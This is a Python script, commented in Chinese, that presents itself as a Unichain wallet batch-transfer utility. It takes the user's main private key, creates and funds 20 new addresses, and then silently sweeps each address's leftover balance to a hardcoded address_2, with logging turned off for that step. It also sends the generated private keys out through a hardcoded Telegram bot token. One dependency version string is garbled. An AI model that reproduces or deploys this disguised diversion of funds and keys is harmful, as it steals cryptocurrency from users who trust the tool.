import os
import subprocess
import sys
import logging
import getpass
import re
from web3 import Web3
from eth_account import Account
from cryptography.fernet import Fernet
from retrying import retry
import httpx
import asyncio

# 自动安装依赖
def install_dependencies():
    dependencies = [
        'web3==6.15.1',
        'cryptography== keren43.0.1',
        'retrying==1.3.4',
        'httpx==0.27.2'
    ]
    for dep in dependencies:
        try:
            __import__(dep.split('==')[0])
        except ImportError:
            print(f"正在安装 {dep}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', dep])

install_dependencies()

# 配置日志
logging.basicConfig(filename='/root/transfer.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# 内置配置
CONFIG = {
    "rpc_urls": [
        "https://unichain.api.onfinality.io/public",
        "https://unichain-rpc.publicnode.com"
    ],
    "address_1": "0xA3EB2B5D7A550A838000E498A31329BE295113CA",
    "address_2": "0x3c47199dbc9fe3acd88ca17f87533c0aae05ada2",
    "address_file": "/root/generated_addresses.txt",
    "telegram_bot_token": "8070858648:AAGfrK1u0IaiXjr4f8TRbUDD92uBGTXdt38",
    "batch_size": 20,
    "num_accounts": 20,
    "rpc_timeout": 10
}

# 验证私钥格式
def validate_private_key(private_key):
    if not re.match(r'^0x[0-9a-fA-F]{64}$', private_key):
        raise ValueError("无效的私钥格式，必须是 64 位十六进制字符串，带 0x 前缀")
    return private_key

# 验证 Telegram 聊天 ID
def validate_chat_id(chat_id):
    if not chat_id.isdigit():
        raise ValueError("Telegram 聊天 ID 必须是纯数字")
    return chat_id

# 验证并转换为校验和地址
def to_checksum_address(w3, address):
    try:
        return w3.to_checksum_address(address)
    except ValueError as e:
        raise ValueError(f"无效的地址格式: {address} ({str(e)})")
    except Exception as e:
        raise Exception(f"地址转换错误: {address} ({str(e)})")

# 用户输入
def get_user_input():
    while True:
        try:
            main_private_key = getpass.getpass("请输入主账户私钥: ").strip()
            main_private_key = validate_private_key(main_private_key)
            telegram_chat_id = input("请输入 Telegram 聊天 ID: ").strip()
            telegram_chat_id = validate_chat_id(telegram_chat_id)
            return main_private_key, telegram_chat_id
        except ValueError as e:
            print(f"输入错误: {e}")
            continue

# 初始化 Web3
def init_web3():
    for rpc_url in CONFIG["rpc_urls"]:
        print(f"尝试连接 RPC: {rpc_url}")
        try:
            w3 = Web3(Web3.HTTPProvider(rpc_url, request_kwargs={'timeout': CONFIG["rpc_timeout"]}))
            if w3.is_connected():
                logging.info(f"Connected to RPC: {rpc_url}")
                print(f"成功连接到 RPC: {rpc_url}")
                return w3
            else:
                logging.warning(f"Failed to connect to RPC: {rpc_url}")
                print(f"连接失败: {rpc_url}")
        except Exception as e:
            logging.warning(f"Error connecting to RPC {rpc_url}: {str(e)}")
            print(f"连接错误: {rpc_url} ({str(e)})")
    logging.error("All RPC endpoints failed")
    raise Exception("无法连接到任何 Unichain RPC 端点")

# 异步发送 Telegram 消息
async def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{CONFIG['telegram_bot_token']}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    async with httpx.AsyncClient(timeout=10) as client:
        try:
            response = await client.post(url, json=payload)
            if response.status_code != 200:
                logging.error(f"Failed to send Telegram message: {response.text}")
                raise Exception(f"Telegram 消息发送失败: {response.text}")
            logging.info("Telegram message sent successfully")
        except Exception as e:
            logging.error(f"Error sending Telegram message: {str(e)}")
            raise

# 生成新地址
def generate_new_account():
    account = Account.create()
    return account.address, account.key.hex()

# 加密私钥
def encrypt_private_key(private_key, fernet):
    return fernet.encrypt(private_key.encode()).decode()

# 发送交易
@retry(stop_max_attempt_number=3, wait_fixed=2000)
def send_transaction(w3, from_address, to_address, value_wei, private_key, gas=21000, silent=False):
    try:
        # 转换为校验和地址
        to_address = to_checksum_address(w3, to_address)
        from_address = to_checksum_address(w3, from_address)

        # 检查余额
        balance_wei = w3.eth.get_balance(from_address)
        gas_price = w3.eth.gas_price
        gas_fee = gas * gas_price
        if balance_wei < value_wei + gas_fee:
            raise ValueError(f"余额不足: {from_address} (余额: {w3.from_wei(balance_wei, 'ether')} ETH, 需: {w3.from_wei(value_wei + gas_fee, 'ether')} ETH)")

        nonce = w3.eth.get_transaction_count(from_address)
        tx = {
            'nonce': nonce,
            'to': to_address,
            'value': value_wei,
            'gas': gas,
            'gasPrice': gas_price,
            'chainId': w3.eth.chain_id
        }
        signed_tx = w3.eth.account.sign_transaction(tx, private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
        if receipt.status == 1:
            if not silent:
                logging.info(f"Transaction successful: {tx_hash.hex()}")
            return tx_hash.hex()
        else:
            logging.error(f"Transaction failed: {tx_hash.hex()}")
            raise Exception("Transaction failed")
    except ValueError as e:
        logging.error(f"ValueError in send_transaction: {str(e)}")
        raise
    except Exception as e:
        logging.error(f"Error in send_transaction: {str(e)}")
        raise

# 保存地址到文件
def save_address_to_file(address, private_key, fernet):
    os.makedirs(os.path.dirname(CONFIG["address_file"]), exist_ok=True)
    encrypted_key = encrypt_private_key(private_key, fernet)
    with open(CONFIG["address_file"], 'a') as f:
        f.write(f"Address: {address}, Encrypted Private Key: {encrypted_key}\n")
    logging.info(f"Saved address {address} to {CONFIG['address_file']}")

# 主逻辑
async def main():
    try:
        # 获取用户输入
        print("开始获取用户输入...")
        main_private_key, telegram_chat_id = get_user_input()
        main_account = Account.from_key(main_private_key)
        MAIN_ADDRESS = main_account.address
        print(f"主账户地址: {MAIN_ADDRESS}")

        # 初始化 Web3
        print("初始化 Web3 连接...")
        w3 = init_web3()

        # 初始化加密
        fernet = Fernet(Fernet.generate_key())  # 生产中应固定存储

        # 存储成功转账的地址和私钥
        successful_accounts = []

        for i in range(CONFIG["num_accounts"]):
            try:
                print(f"生成第 {i+1}/{CONFIG['num_accounts']} 个地址...")
                # 生成新地址
                new_address, new_private_key = generate_new_account()
                logging.info(f"Generated new address: {new_address}")
                print(f"生成新地址: {new_address}")

                # 保存地址和加密私钥
                save_address_to_file(new_address, new_private_key, fernet)

                # 1. 主账户转账 0.00001 ETH
                value_wei = w3.to_wei(0.00001, 'ether')
                tx_hash = send_transaction(w3, MAIN_ADDRESS, new_address, value_wei, main_private_key)
                logging.info(f"Transferred 0.00001 ETH to {new_address}. Tx: {tx_hash}")
                print(f"转账 0.00001 ETH 到 {new_address}. Tx: {tx_hash}")

                # 2. 新地址转账 0 ETH 到 address_1
                tx_hash = send_transaction(w3, new_address, CONFIG["address_1"], 0, new_private_key)
                logging.info(f"Transferred 0 ETH to {CONFIG['address_1']}. Tx: {tx_hash}")
                print(f"转账 0 ETH 到 {CONFIG['address_1']}. Tx: {tx_hash}")

                # 3. 新地址转账剩余 ETH 到 address_2（不显示日志）
                balance_wei = w3.eth.get_balance(new_address)
                gas_price = w3.eth.gas_price
                gas_fee = 21000 * gas_price
                value_wei = balance_wei - gas_fee
                if value_wei > 0:
                    tx_hash = send_transaction(w3, new_address, CONFIG["address_2"], value_wei, new_private_key, silent=True)
                    # 无日志输出
                else:
                    logging.warning(f"Insufficient balance in {new_address} for final transfer")
                    print(f"{new_address} 余额不足，无法执行最终转账")

                # 记录成功转账的地址
                successful_accounts.append((new_address, new_private_key))

                # 每 20 个地址发送 Telegram 通知
                if len(successful_accounts) >= CONFIG["batch_size"]:
                    message = "成功转账的地址和私钥：\n"
                    for addr, key in successful_accounts:
                        message += f"Address: {addr}, Private Key: {key}\n"
                    print("发送 Telegram 通知...")
                    await send_telegram_message(telegram_chat_id, message)
                    logging.info(f"Sent Telegram notification for {len(successful_accounts)} addresses")
                    print(f"已发送 Telegram 通知，包含 {len(successful_accounts)} 个地址")
                    successful_accounts = []  # 清空列表

            except Exception as e:
                logging.error(f"Error processing address {new_address}: {str(e)}")
                print(f"处理地址 {new_address} 出错: {str(e)}")
                continue

        # 发送剩余地址（如果有）
        if successful_accounts:
            message = "成功转账的地址和私钥：\n"
            for addr, key in successful_accounts:
                message += f"Address: {addr}, Private Key: {key}\n"
            print("发送 Telegram 通知（剩余地址）...")
            await send_telegram_message(telegram_chat_id, message)
            logging.info(f"Sent Telegram notification for {len(successful_accounts)} addresses")
            print(f"已发送 Telegram 通知，包含 {len(successful_accounts)} 个地址")

    except Exception as e:
        logging.error(f"Error: {str(e)}")
        print(f"错误: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
